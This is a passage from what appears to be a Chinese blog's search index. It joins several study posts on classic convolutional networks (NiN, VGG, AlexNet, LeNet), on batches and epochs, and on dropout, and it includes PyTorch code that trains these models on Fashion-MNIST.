NiN提出了另外一个思路，即串联多个由卷积层和“全连接”层(NiN使用1×11×1卷积层来替代全连接层，从而使空间信息能够自然传递到后面的层中去)构成的小网络来构建一个深层网络 NiN是在AlexNet问世不久后提出的 NiN块是NiN中的基础块。它的架构： 无全连接层 交替使用一个卷积层加两个充当全连接层的1×1卷积层串联而成。 其中第一个卷积层的超参数可以自行设置，而第二和第三个卷积层的超参数一般是固定的。 除使用NiN块以外，NiN还有一个设计与AlexNet显著不同：NiN去掉了AlexNet最后的3个全连接层(全连接层耗时且容易过拟合)，取而代之地，NiN使用了输出通道数等于标签类别数的NiN块，然后使用全局平均池化层对每个通道中所有元素求平均并直接用于分类 https://zhuanlan.zhihu.com/p/47391705 import torch from torch import nn from d2l import torch as d2l def nin_block(in_channels, out_channels, kernel_size, strides, padding): \"\"\" NiN块 \"\"\" return nn.Sequential( nn.Conv2d(in_channels, out_channels, kernel_size, strides, padding), nn.ReLU(), # 这里等于是用1*1卷积代替全连接层，见附录 nn.Conv2d(out_channels, out_channels, kernel_size=1), nn.ReLU(), nn.Conv2d(out_channels, out_channels, kernel_size=1), nn.ReLU()) # alexnet同时期算法 net = nn.Sequential( nin_block(1, 96, kernel_size=11, strides=4, padding=0), nn.MaxPool2d(3, stride=2), nin_block(96, 256, kernel_size=5, strides=1, padding=2), nn.MaxPool2d(3, stride=2), nin_block(256, 384, kernel_size=3, strides=1, padding=1), nn.MaxPool2d(3, stride=2), nn.Dropout(0.5), # 标签类别数是10 nin_block(384, 10, kernel_size=3, strides=1, padding=1), nn.AdaptiveAvgPool2d((1, 1)), # 将四维的输出转成⼆维的输出，其形状为(批量⼤⼩, 10) nn.Flatten()) # softmax写在train函数里面了，交叉熵 X = torch.randn(size=(1, 1, 224, 224)) for blk in net: X = blk(X) print(blk.__class__.__name__,'output shape:\\t',X.shape) lr, num_epochs, batch_size = 0.1, 10, 128 train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size, resize=224) d2l.train_ch6(net, train_iter, test_iter, num_epochs, lr, d2l.try_gpu()) ","date":"2022-09-15","objectID":"/%E7%BB%8F%E5%85%B8%E7%8E%B0%E4%BB%A3%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C3-%E7%BD%91%E7%BB%9C%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C/:0:0","tags":["NiN"],"title":"经典现代卷积网络3-网络中的网络(NiN)","uri":"/%E7%BB%8F%E5%85%B8%E7%8E%B0%E4%BB%A3%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C3-%E7%BD%91%E7%BB%9C%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C/"},{"categories":["AI"],"content":" VGG:更大更深、VGG块 VGG块的组成规律是：连续重复使用数个相同的 填充为1、窗口形状为3×3的卷积层后(33卷积比55卷积好) 接上一个步幅为2、窗口形状为2×2的最大池化层。 卷积层保持输入的高和宽不变，而池化层则对其减半 VGG架构： import time import torch from torch import nn, optim def vgg_block(num_convs,in_channels,out_channels): \"\"\"定义vgg块 Args: num_convs (int): 需要卷积层数量 in_channels (int): 输入通道数 out_channels (int): 输出通道数 \"\"\" layers = [] for _ in range(num_convs): layers.append( nn.Conv2d(in_channels,out_channels,kernel_size=3,padding=1) ) layers.append(nn.ReLU()) in_channels = out_channels layers.append(nn.MaxPool2d(kernel_size=2,stride=2)) return nn.Sequential(*layers) # 实现vgg架构,vgg含有5个vgg块 conv_arch = ( (1,64), (1,128), (2,256), (2,512), (2,512), ) def vgg(conv_arch): conv_blks = [] in_channels = 1 for (num_convs,out_channels) in conv_arch: conv_blks.append( vgg_block(num_convs,in_channels,out_channels) ) in_channels = out_channels net = nn.Sequential( *conv_blks, nn.Flatten(), nn.Linear(out_channels*7*7,4096),nn.ReLU(),nn.Dropout(0.5), nn.Linear(4096,4096),nn.ReLU(),nn.Dropout(0.5), nn.Linear(4096,10) ) return net net = vgg(conv_arch) # 经典设计模式，每次图片大小缩小一半 通道数增加一杯 X = torch.randn(size=(1, 1, 224, 224)) for blk in net: X = blk(X) print(blk.__class__.__name__,'output shape:\\t',X.shape) # 这里是作为演示，因为VGG-11比AlexNet计算量更大，因此我们构建一个通道数较少的神经网络 ratio = 4 small_conv_arch = [(pair[0], pair[1] // ratio) for pair in conv_arch] print(small_conv_arch) net = vgg(small_conv_arch) # X = torch.randn(size=(1, 1, 224, 224)) # for blk in net: # X = blk(X) # print(blk.__class__.__name__,'output shape:\\t',X.shape) lr, num_epochs, batch_size = 0.05, 10, 128 train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size, resize=224) d2l.train_ch6(net, train_iter, test_iter, num_epochs, lr, d2l.try_gpu()) 总结： VGG使用可重复使用的卷积块来构建深度卷积神经网络 不同的卷积块个数个超参数可以得到不同复杂度的变种 我电脑已经跑不动了，菜的人只能看着理论…… ","date":"2022-09-15","objectID":"/%E7%BB%8F%E5%85%B8%E7%8E%B0%E4%BB%A3%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C2-%E4%BD%BF%E7%94%A8%E9%87%8D%E5%A4%8D%E5%9D%97%E7%9A%84%E7%BD%91%E7%BB%9C-vgg/:0:0","tags":["VGG","CNN"],"title":"经典现代卷积网络2-使用重复块的网络(VGG)","uri":"/%E7%BB%8F%E5%85%B8%E7%8E%B0%E4%BB%A3%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C2-%E4%BD%BF%E7%94%A8%E9%87%8D%E5%A4%8D%E5%9D%97%E7%9A%84%E7%BD%91%E7%BB%9C-vgg/"},{"categories":["AI"],"content":"前言 接下来一次介绍现代卷积神经网络的架构： AlexNet。它是第一个在大规模视觉竞赛中击败传统计算机视觉模型的大型神经网络； 使用重复块的网络（VGG）。它利用许多重复的神经网络块； 网络中的网络（NiN）。它重复使用由卷积层和卷积层（用来代替全连接层）来构建深层网络; 含并行连结的网络（GoogLeNet）。它使用并行连结的网络，通过不同窗口大小的卷积层和最大汇聚层来并行抽取信息； 残差网络（ResNet）。它通过残差块构建跨层的数据通道，是计算机视觉中最流行的体系架构； 稠密连接网络（DenseNet）。它的计算成本很高，但给我们带来了更好的效果 ","date":"2022-09-15","objectID":"/%E7%BB%8F%E5%85%B8%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C-alexnet/:1:0","tags":["AlexNet","CNN"],"title":"经典现代卷积网络1-AlexNet","uri":"/%E7%BB%8F%E5%85%B8%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C-alexnet/"},{"categories":["AI"],"content":"LeNet 在LeNet提出后的将近20年里，神经网络一度被其他机器学习方法超越，如支持向量机. LeNet可以在早期的小数据集上取得好的成绩，但是在更大的真实数据集上的表现并不尽如人意. 一节看到，神经网络可以直接基于图像的原始像素进行分类。这种称为端到端（end-to-end）的方法节省了很多中间步骤。 这类图像分类研究的主要流程是： 获取图像数据集； 使用已有的特征提取函数生成图像的特征； 使用机器学习模型对图像的特征分类。 与训练端到端（从像素到分类结果）系统不同，经典机器学习的流水线看起来更像下面这样： 获取一个有趣的数据集。在早期，收集这些数据集需要昂贵的传感器（在当时最先进的图像也就100万像素）。 根据光学、几何学、其他知识以及偶然的发现，手工对特征数据集进行预处理。 通过标准的特征提取算法，如SIFT或其他手动调整的流水线来输入数据。 将提取的特征送入最喜欢的分类器中（例如线性模型或其它核方法），以训练分类器。 2012年，AlexNet横空出世。它首次证明了学习到的特征可以超越手工设计的特征。它一举打破了计算机视觉研究的现状，通过CNN学习特征 。 AlexNet使用了8层卷积神经网络，并以很大的优势赢得了2012年ImageNet图像识别挑战赛。 简化的两个网络的对比： stride=4 是受限于当时的算力所致 复杂度对比： ","date":"2022-09-15","objectID":"/%E7%BB%8F%E5%85%B8%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C-alexnet/:2:0","tags":["AlexNet","CNN"],"title":"经典现代卷积网络1-AlexNet","uri":"/%E7%BB%8F%E5%85%B8%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C-alexnet/"},{"categories":["AI"],"content":"AlexNet与LeNet区别 AlexNet与LeNet的设计理念非常相似，但也有显著的区别。 第一，与相对较小的LeNet相比，AlexNet包含8层变换，其中有5层卷积和2层全连接隐藏层，以及1个全连接输出层。 在AlexNet的第一层，卷积窗口的形状是。 由于ImageNet中大多数图像的宽和高比MNIST图像的多10倍以上，因此，需要一个更大的卷积窗口来捕获目标。 第二层中的卷积窗口形状被缩减为，然后是。 此外，在第一层、第二层和第五层卷积层之后，加入窗口形状为、步幅为2的最大汇聚层。 而且，AlexNet的卷积通道数目是LeNet的10倍。 在最后一个卷积层后有两个全连接层，分别有4096个输出。 这两个巨大的全连接层拥有将近1GB的模型参数。 由于早期GPU显存有限，原版的AlexNet采用了双数据流设计，使得每个GPU只负责存储和计算模型的一半参数。 幸运的是，现在GPU显存相对充裕，所以我们现在很少需要跨GPU分解模型（因此，我们的AlexNet模型在这方面与原始论文稍有不同） 第二，AlexNet将sigmoid激活函数改成了更加简单的ReLU激活函数。 第三，AlexNet通过丢弃法来控制全连接层的模型复杂度。而LeNet没有使用丢弃法，而只是使用了权重衰减。（在隐藏全连接层厚加入了丢弃层） 第四，AlexNet引入了大量的图像增广，如翻转、裁剪和颜色变化，从而进一步扩大数据集来缓解过拟合。 AlexNet跟LeNet结构类似，但使用了更多的卷积层和更大的参数空间来拟合大规模数据集ImageNet。它是浅层神经网络和深度神经网络的分界线。 ","date":"2022-09-15","objectID":"/%E7%BB%8F%E5%85%B8%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C-alexnet/:2:1","tags":["AlexNet","CNN"],"title":"经典现代卷积网络1-AlexNet","uri":"/%E7%BB%8F%E5%85%B8%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C-alexnet/"},{"categories":["AI"],"content":"实现AlexNet 稍微简化的AlexNet： import time import torch from torch import nn, optim import torchvision net = nn.Sequential( nn.Conv2d(1,96,kernel_size=11,stride=4,padding=1), # [1, 96, 54, 54] nn.ReLU(), nn.MaxPool2d(kernel_size=3,stride=2), # [1,96,26,26] nn.Conv2d(96,256,kernel_size=5,padding=2), nn.ReLU(), nn.MaxPool2d(kernel_size=3,stride=2), nn.Conv2d(256,384,kernel_size=3,padding=1),nn.ReLU(), nn.Conv2d(384,384,kernel_size=3,padding=1),nn.ReLU(), # (384-3+2)/1 + 1 = 384 nn.Conv2d(384,256,kernel_size=3,padding=1),nn.ReLU(), nn.MaxPool2d(kernel_size=3,stride=2), nn.Flatten(), # [1, 256, 5, 5] ---\u003e[1, 6400] flatten默认从维度1开始flatten nn.Linear(6400,4096),nn.ReLU(),nn.Dropout(p=0.5), nn.Linear(4096,4096),nn.ReLU(),nn.Dropout(p=0.5), nn.Linear(4096,10) ) # 这里可以预先检查一下，输入输出是否合理 X = torch.rand(size=(1,1,224,224),dtype=torch.float32) for layer in net: X = layer(X) # \\t相当于tab按键 print(layer.__class__.__name__,'output shape: \\t',X.shape) # 尝试用X进行试验，可以看出每层输出的维度，这样也可以使得输入输出按照自己需求来 1.加载数据： ImageNet数据集中图片的大小为369*387， 我们这里使用Fashion-MNIST数据集来演示AlexNet。读取数据的时候我们额外做了一步将图像高和宽扩大到AlexNet使用的图像高和宽224。这个可以通过torchvision.transforms.Resize实例来实现。也就是说，我们在ToTensor实例前使用Resize实例，然后使用Compose实例来将这两个变换串联以方便调 def load_data_fashion_mnist(batch_size, resize=None, root='~/Datasets/FashionMNIST'): \"\"\"Download the fashion mnist dataset and then load into memory.\"\"\" if sys.platform.startswith('win'): num_workers = 0 else: num_workers = 4 trans = [] if resize: trans.append(torchvision.transforms.Resize(size=resize)) trans.append(torchvision.transforms.ToTensor()) transform = torchvision.transforms.Compose(trans) mnist_train = torchvision.datasets.FashionMNIST(root=root, train=True, download=True, transform=transform) mnist_test = torchvision.datasets.FashionMNIST(root=root, train=False, download=True, transform=transform) train_iter = torch.utils.data.DataLoader(mnist_train, batch_size=batch_size, shuffle=True, num_workers=4) test_iter = torch.utils.data.DataLoader(mnist_test, batch_size=batch_size, shuffle=False, num_workers=4) return train_iter, test_iter batch_size=128 train_iter, test_iter=load_data_fashion_mnist(batch_size, resize=224) # 如出现“out of memory”的报错信息，可减小batch_size或resize 2.构建模型： import time import torch from torch import nn, optim import torchvision import d2lzh_pytorch as d2l device = torch.device('cuda' if torch.cuda.is_available() else 'cpu') class AlexNet(nn.Module): def __init__(self): super(AlexNet, self).__init__() self.conv = nn.Sequential( nn.Conv2d(1, 96, 11, 4), # in_channels, out_channels, kernel_size, stride, padding nn.ReLU(), nn.MaxPool2d(3, 2), # kernel_size, stride # 减小卷积窗口，使用填充为2来使得输入与输出的高和宽一致，且增大输出通道数 nn.Conv2d(96, 256, 5, 1, 2), nn.ReLU(), nn.MaxPool2d(3, 2), # 连续3个卷积层，且使用更小的卷积窗口。除了最后的卷积层外，进一步增大了输出通道数。 # 前两个卷积层后不使用池化层来减小输入的高和宽 nn.Conv2d(256, 384, 3, 1, 1), nn.ReLU(), nn.Conv2d(384, 384, 3, 1, 1), nn.ReLU(), nn.Conv2d(384, 256, 3, 1, 1), nn.ReLU(), nn.MaxPool2d(3, 2) ) # 这里全连接层的输出个数比LeNet中的大数倍。使用丢弃层来缓解过拟合 self.fc = nn.Sequential( nn.Linear(256*5*5, 4096), nn.ReLU(), nn.Dropout(0.5), nn.Linear(4096, 4096), nn.ReLU(), nn.Dropout(0.5), # 输出层。由于这里使用Fashion-MNIST，所以用类别数为10，而非论文中的1000 nn.Linear(4096, 10), ) def forward(self, img): feature = self.conv(img) output = self.fc(feature.view(img.shape[0], -1)) return output 如果用imagenet的彩色图片就是： import torch.nn as nn import torch class AlexNet(nn.Module): def __init__(self, num_classes=1000, init_weights=False): super(AlexNet, self).__init__() self.features = nn.Sequential( #打包 nn.Conv2d(3, 48, kernel_size=11, stride=4, padding=2), # input[3, 224, 224] output[48, 55, 55] 自动舍去小数点后 nn.ReLU(inplace=True), #inplace 可以载入更大模型 nn.MaxPool2d(kernel_size=3, stride=2), # output[48, 27, 27] kernel_num为原论文一半 nn.Conv2d(48, 128, kernel_size=5, padding=2), # output[128, 27, 27] nn.ReLU(inplace=True), nn.MaxPool2d(kernel_size=3, stride=2), # output[128, 13, 13] nn.Conv2d(128, 192, kernel_size=3, padding=1), # output[192, 13, 13] nn.ReLU(inplace=True), nn.Conv2d(192, 192, kernel_size=3, padding=1), # output[192, 13, 13] nn.","date":"2022-09-15","objectID":"/%E7%BB%8F%E5%85%B8%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C-alexnet/:2:2","tags":["AlexNet","CNN"],"title":"经典现代卷积网络1-AlexNet","uri":"/%E7%BB%8F%E5%85%B8%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C-alexnet/"},{"categories":["AI"],"content":"完整代码： import time import torch from torch import nn, optim import torchvision device = torch.device('cuda' if torch.cuda.is_available() else 'cpu') def load_data_fashion_mnist(batch_size, resize=None, root='../data/FashionMNIST'): \"\"\" 下载/加载 fashion mnist数据集 读取数据的时候我们额外做了一步将图像高和宽扩大到AlexNet使用的图像高和宽224。 这个可以通过`torchvision.transforms.Resize`实例来实现。也就是说， 我们在ToTensor实例前使用Resize实例，然后使用Compose实例来将这两个变换串联以方便调 \"\"\" # if sys.platform.startswith('win'): # num_workers = 0 # else: # num_workers = 4 trans = [] if resize: trans.append(torchvision.transforms.Resize(size=resize)) trans.append(torchvision.transforms.ToTensor()) transform = torchvision.transforms.Compose(trans) mnist_train = torchvision.datasets.FashionMNIST(root=root, train=True, download=True, transform=transform) mnist_test = torchvision.datasets.FashionMNIST(root=root, train=False, download=True, transform=transform) train_iter = torch.utils.data.DataLoader(mnist_train, batch_size=batch_size, shuffle=True, num_workers=4) test_iter = torch.utils.data.DataLoader(mnist_test, batch_size=batch_size, shuffle=False, num_workers=4) return train_iter, test_iter class AlexNet(nn.Module): def __init__(self): super(AlexNet, self).__init__() self.conv = nn.Sequential( nn.Conv2d(1, 96, kernel_size=11, stride=4, padding=1), # [1, 96, 54, 54] nn.ReLU(), nn.MaxPool2d(3, 2), # kernel_size, stride # 减小卷积窗口，使用填充为2来使得输入与输出的高和宽一致，且增大输出通道数 nn.Conv2d(96, 256, kernel_size=5, padding=2), nn.ReLU(), nn.MaxPool2d(3, 2), # 连续3个卷积层，且使用更小的卷积窗口。除了最后的卷积层外，进一步增大了输出通道数。 # 前两个卷积层后不使用池化层来减小输入的高和宽 nn.Conv2d(256, 384, kernel_size=3, padding=1), nn.ReLU(), nn.Conv2d(384, 384, kernel_size=3, padding=1), nn.ReLU(), # (384-3+2)/1 + 1 = 384 nn.Conv2d(384, 256, kernel_size=3, padding=1), nn.ReLU(), nn.MaxPool2d(kernel_size=3, stride=2), nn.Flatten(), # [1, 256, 5, 5] ---\u003e[1, 6400] flatten默认从维度1开始flatten ) # 这里全连接层的输出个数比LeNet中的大数倍。使用丢弃层来缓解过拟合 self.fc = nn.Sequential( nn.Linear(256*5*5, 4096), nn.ReLU(), nn.Dropout(p=0.5), nn.Linear(4096, 4096), nn.ReLU(), nn.Dropout(0.5), # 输出层:由于这里使用Fashion-MNIST，所以用类别数为10，而非论文中的1000 nn.Linear(4096, 10), ) def forward(self, img): feature = self.conv(img) output = self.fc(feature.view(img.shape[0], -1)) return output def evaluate_accuracy(data_iter, net, device=None): \"\"\" 精度评价 \"\"\" if device is None and isinstance(net, torch.nn.Module): # 如果没指定device就使用net的device device = list(net.parameters())[0].device acc_sum, n = 0.0, 0 with torch.no_grad(): for X, y in data_iter: net.eval() # 评估模式, 这会关闭dropout acc_sum += (net(X.to(device)).argmax(dim=1) == y.to(device)).float().sum().cpu().item() # torch.argmax(input, dim=None, keepdim=False)返回指定维度最大值的序号。也就是把dim这个维度的，变成这个维度的最大值的index：https://blog.csdn.net/qq_35812205/article/details/122368033 net.train() # 改回训练模式 n += y.shape[0] return acc_sum / n def train(net, train_iter, test_iter, batch_size, optimizer, device, num_epochs): \"\"\" 训练模型 \"\"\" net = net.to(device) print(\"training on \", device) loss = torch.nn.CrossEntropyLoss() # 采用交叉熵损失 for epoch in range(num_epochs): # epoch 训练轮数 train_l_sum, train_acc_sum, n, batch_count, start = 0.0, 0.0, 0, 0, time.time() for X, y in train_iter: X = X.to(device) y = y.to(device) y_hat = net(X) l = loss(y_hat, y) # 计算损失 optimizer.zero_grad() # 梯度清零 l.backward() # 反向传播 optimizer.step() # 更新 train_l_sum += l.cpu().item() # train_l_sum是训练集损失 train_acc_sum += (y_hat.argmax(dim=1) == y).sum().cpu().item() # train_acc_sum是训练集精度 n += y.shape[0] batch_count += 1 # 评估在测试集精度 test_acc = evaluate_accuracy(test_iter, net) print('epoch %d, loss %.4f, train acc %.3f, test acc %.3f, time %.1f sec' % (epoch + 1, train_l_sum / batch_count, train_acc_sum / n, test_acc, time.time() - start)) if __name__ == '__main__': batch_size, lr, num_epochs = 128, 0.001, 5 train_iter, test_iter = load_data_fashion_mnist(batch_size, resize=224) net = AlexNet() optimizer = torch.optim.Adam(net.parameters(), lr=lr) train(net, train_iter, test_iter, batch_size, optimizer, device, num_epochs) 我不跑了，忽然发现我的小mac已经烫手了，才跑了一个epoch，用时15分钟….唉没有配置好点的电脑学习都学不了…… 一些可视","date":"2022-09-15","objectID":"/%E7%BB%8F%E5%85%B8%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C-alexnet/:3:0","tags":["AlexNet","CNN"],"title":"经典现代卷积网络1-AlexNet","uri":"/%E7%BB%8F%E5%85%B8%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C-alexnet/"},{"categories":["AI"],"content":"LeNet 1989年提出的 是早期成功的神经网络 先使用卷积层来学习图片空间信息 然后使用全连接层转换到类别空间 LeNet交替使用卷积层和最大池化层后接全连接层来进行图像分类。 LeNet分为卷积层块和全连接层快两部分： 卷积层块里的基本单位是卷积层后接最大池化层：卷积层用来识别图像里的空间模式，如线条和物体局部，之后的最大池化层则用来降低卷积层对位置的敏感性。卷积层块由两个这样的基本单位重复堆叠构成。 卷积层块的输出形状为(批量大小, 通道, 高, 宽)。当卷积层块的输出传入全连接层块时，全连接层块会将小批量中每个样本变平（flatten）。也就是说，全连接层的输入形状将变成二维，其中第一维是小批量中的样本，第二维是每个样本变平后的向量表示，且向量长度为通道、高和宽的乘积。全连接层块含3个全连接层。它们的输出个数分别是120、84和10，其中10为输出的类别个数。 其中形状是第一列输入的image的形状大小进行计算的 网络实现： import torch from torch import nn from d2l import d2ltorch as d2l class Reshape(torch.nn.Module): def forward(self, x): return x.view(-1, 1, 28, 28) net = torch.nn.Sequential( Reshape(), # 原始图片为32*32 reshape为28*28后 需要进行2的填充 # 这里填充的目的是为了防止边缘信息被剪掉 nn.Conv2d(1,6,kernel_size=5,padding=2), # 激活函数 nn.Sigmoid(), # 卷积核为2 步幅为2 的均值池化层 nn.AvgPool2d(kernel_size=2,stride=2), nn.Conv2d(6,16,kernel_size=5), nn.Sigmoid(), nn.AvgPool2d(kernel_size=2,stride=2), # 展平层，然后开始全连接层 nn.Flatten(), nn.Linear(16*5*5,120), nn.Sigmoid(), nn.Linear(120,84), nn.Sigmoid(), nn.Linear(84,10) # 我们对原始模型做了⼀点小改动，去掉了最后⼀层的⾼斯激活 ) 这里可以预先检查一下，输入输出是否合理: X = torch.rand(size=(1,1,28,28),dtype=torch.float32) for layer in net: X = layer(X) # \\t相当于tab按键 print(layer.__class__.__name__,'output shape: \\t',X.shape) # 尝试用X进行试验，可以看出每层输出的维度，这样也可以使得输入输出按照自己需求来 或者下面这样写： device = torch.device('cuda' if torch.cuda.is_available() else 'cpu') class LeNet(nn.Module): def __init__(self): super(LeNet, self).__init__() self.conv = nn.Sequential( nn.Conv2d(1, 6, 5), # in_channels, out_channels, kernel_size nn.Sigmoid(), nn.MaxPool2d(2, 2), # kernel_size, stride nn.Conv2d(6, 16, 5), # 16层厚 nn.Sigmoid(), nn.MaxPool2d(2, 2) ) self.fc = nn.Sequential( nn.Linear(16*4*4, 120), # 这里其实还是进行一个卷积操作，通过120个5*5的卷积使得图像变为120*1*1 nn.Sigmoid(), nn.Linear(120, 84), nn.Sigmoid(), nn.Linear(84, 10) ) def forward(self, img): feature = self.conv(img) output = self.fc(feature.view(img.shape[0], -1)) # 卷积层和全连接层之间需要调整维度 return output net = LeNet() 在整个卷积块中，与上⼀层相⽐，每⼀层特征的⾼度和宽度都减小了。 第⼀个卷积层使⽤2 个像素的填充，来补偿5X5 卷积核导致的特征减少。 相反，第⼆个卷积层没有填充，因此⾼度和宽度都减少了4 个像素。随着层叠的上升，通道的数量从输⼊时的1 个，增加到第⼀个卷积层之后的6 个，再到第⼆个卷积层 之后的16 个。 同时，每个汇聚层的⾼度和宽度都减半。最后，每个全连接层减少维数，最终输出⼀个维数与结果分类数相匹配的输出。 数据加载：使用Fashion-MNIST作为训练数据集 # 数据加载 batch_size = 256 train_iter,test_iter = d2l.load_data_fashion_mnist(batch_size=batch_size) # iter(train_iter).__next__()[0].shape 评估函数： # 因为卷积神经网络计算比多层感知机要复杂，建议使用GPU来加速计算 # 对评估函数进行GPU的实现 def evaluate_accuracy_gpu(net,data_iter,device = None): \"\"\"使用GPU进行计算\"\"\" # isinstance函数 用于判别 # 用于选择第一个设备 if isinstance(net,torch.nn.Module): net.eval() if not device: device = next(iter(net.parameters())).device # 正确预测的数量，总预测的数量 metric = d2l.Accumulator(2) for X,y in data_iter: # 如果x是list，那么把设备都加进去 if isinstance(X,list): X = [x.to(device) for x in X] else: X = X.to(device) y = y.to(device) # 返回准确率、y的元素个数 metric.add(d2l.accuracy(net(X),y), y.numel()) return metric[0]/metric[1] # 正确的/个数 训练： def train_ch6(net,train_iter,test_iter,num_epochs,lr,device): \"\"\"Gpu 训练模型\"\"\" # 权重初始化函数 def init_weights(m): if isinstance(m,nn.Linear) or isinstance(m,nn.ConstantPad2d): nn.init.xavier_uniform_(m.weight) # xavier_uniform_初始化函数 # 应用权重分配 net.apply(init_weights) print(\"traing on\",device) # 模型构建好后整体进行迁移 net.to(device) optimizer = torch.optim.SGD(net.parameters(),lr = lr) # optimizer = torch.optim.Adam(net.parameters(),lr = lr) loss = nn.CrossEntropyLoss() # 该函数主要用于动画展示 animator = d2l.Animator(xlabel='epoch', xlim=[1, num_epochs], legend=['train loss', 'train acc', 'test acc']) timer, num_batches = d2l.Timer(), len(train_iter) # epoch指的是整体数据需要循环十遍 for epoch in range(num_epochs): # 训练损失之和，训练准确率之和，范例数 metric = d2l.Accumulator(3) net.train() # 标准循环 for i, (X, y) in enumerate(train_iter): # 以batch_size大小进行训练 timer.start() # 梯度归零 optimizer.zero_grad() # 输入输出放入GPU X, y = X.to(device), y.to(device) # 正向操作 y_hat = net(X) # 计算损失 l = loss(y_hat, y) # 计算梯度 l.backward() # 迭代 optimizer.step() # 以下部分主要用于输出一些指标 with torch.no_grad(): metric.add(l * X.shape[0], d2l.accuracy(y_hat, y), X.shape[0]) timer.stop() train_l = metric[0] / metric[2] train_acc = metric[1] / metric[2] i","date":"2022-09-15","objectID":"/%E7%BB%8F%E5%85%B8%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C-lenet/:1:0","tags":["LeNet","CNN"],"title":"经典卷积网络-LeNet","uri":"/%E7%BB%8F%E5%85%B8%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C-lenet/"},{"categories":["AI"],"content":"尺寸变化 卷积之后尺寸的变化： 若图像为正方形：设输入图像尺寸为WxW，卷积核尺寸为FxF，步幅为S，Padding使用P,经过该卷积层后输出的图像尺寸为NxN： $$ (W = \\frac{W+2P-F}{S} + 1, H = \\frac{H+2P-F}{S} + 1) $$ 池化之后： 设输入图像尺寸为WxH，其中W:图像宽，H:图像高，D:图像深度（通道数），卷积核的尺寸为FxF，S:步长(步长S就等于池化核的尺寸) $$ W = \\frac{W-F}{S} + 1, H = \\frac{H-F}{S} + 1, $$ ","date":"2022-09-15","objectID":"/%E7%BB%8F%E5%85%B8%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C-lenet/:2:0","tags":["LeNet","CNN"],"title":"经典卷积网络-LeNet","uri":"/%E7%BB%8F%E5%85%B8%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C-lenet/"},{"categories":["AI"],"content":" Batch是大小 epoch是数量 ","date":"2022-09-13","objectID":"/batch%E5%92%8Cepoch/:0:0","tags":null,"title":"Batch和epoch","uri":"/batch%E5%92%8Cepoch/"},{"categories":["AI"],"content":"Batch Batch大小是一个超参数，用于定义在更新内部模型参数之前要处理的样本数。将批处理视为循环迭代一个或多个样本并进行预测。在批处理结束时，将预测与预期输出变量进行比较，并计算误差。从该错误中，更新算法用于改进模型，例如沿误差梯度向下移动。训练数据集可以分为一个或多个Batch。当所有训练样本用于创建一个Batch时，学习算法称为批量梯度下降。当批量是一个样本的大小时，学习算法称为随机梯度下降。当批量大小超过一个样本且小于训练数据集的大小时，学习算法称为小批量梯度下降。 在小批量梯度下降的情况下，流行的批量大小包括32,64和128个样本。 ","date":"2022-09-13","objectID":"/batch%E5%92%8Cepoch/:1:0","tags":null,"title":"Batch和epoch","uri":"/batch%E5%92%8Cepoch/"},{"categories":["AI"],"content":"Epoch Epoch数是一个超参数，它定义了学习算法在整个训练数据集中的工作次数。一个Epoch意味着训练数据集中的每个样本都有机会更新内部模型参数。Epoch由一个或多个Batch组成。例如，如上所述，具有一批的Epoch称为批量梯度下降学习算法。您可以将for循环放在每个需要遍历训练数据集的epoch上，在这个for循环中是另一个嵌套的for循环，它遍历每批样本，其中一个批次具有指定的“批量大小”样本数。 epochs 数量传统上很大，通常是数百或数千，允许学习算法运行直到模型的误差被充分地最小化了。您可能会看到文献和教程设置为10,100,500,1000和更大的时期数量的示例。通常创建线图，其显示沿x轴的时间以及模型在y轴上的误差或技能。这些图有时被称为学习曲线。这些图可以帮助诊断模型是否已经过度学习，学习不足或者是否适合训练数据集。 ","date":"2022-09-13","objectID":"/batch%E5%92%8Cepoch/:2:0","tags":null,"title":"Batch和epoch","uri":"/batch%E5%92%8Cepoch/"},{"categories":["AI"],"content":"实例 假设您有一个包含200个样本（数据行）的数据集，并且您选择的Batch大小为5和1,000个Epoch。 这意味着数据集将分为40个Batch，每个Batch有5个样本。每批五个样品后，模型权重将更新。 这也意味着一个epoch将涉及40个Batch或40个模型更新。 有1000个Epoch，模型将暴露或传递整个数据集1,000次。在整个培训过程中，总共有40,000Batch。 https://blog.csdn.net/daxuan1881/article/details/123072024 ","date":"2022-09-13","objectID":"/batch%E5%92%8Cepoch/:3:0","tags":null,"title":"Batch和epoch","uri":"/batch%E5%92%8Cepoch/"},{"categories":["AI"],"content":" 除了前一节介绍的权重衰减以外，深度学习模型常常使用丢弃法（dropout）来应对过拟合问题 标准处理流程： $ℎ=σ(𝑊1𝑥+𝑏1)$ 第一个隐藏层 $ℎ′=𝑑𝑟𝑜𝑝𝑜𝑢𝑡(ℎ)$ 进行随机的删除 $𝑜=𝑊2ℎ′+𝑏2$ 第二层输出 $𝑦=𝑠𝑜𝑓𝑡𝑚𝑎𝑥(𝑜)$ softmax层输出 在测试模型时，我们为了拿到更加确定性的结果，一般不使用丢弃法。 ","date":"2022-09-13","objectID":"/%E4%B8%A2%E5%BC%83%E6%B3%95/:0:0","tags":["丢弃法","dropout"],"title":"丢弃法(dropout)","uri":"/%E4%B8%A2%E5%BC%83%E6%B3%95/"},{"categories":["AI"],"content":"实现 import torch from torch import nn from d2l import d2ltorch as d2l # 定义丢弃函数 # 将以dropout的概率丢弃X中的元素 def dropout_layer(X,dropout): assert 0 \u003c= dropout \u003c=1 # 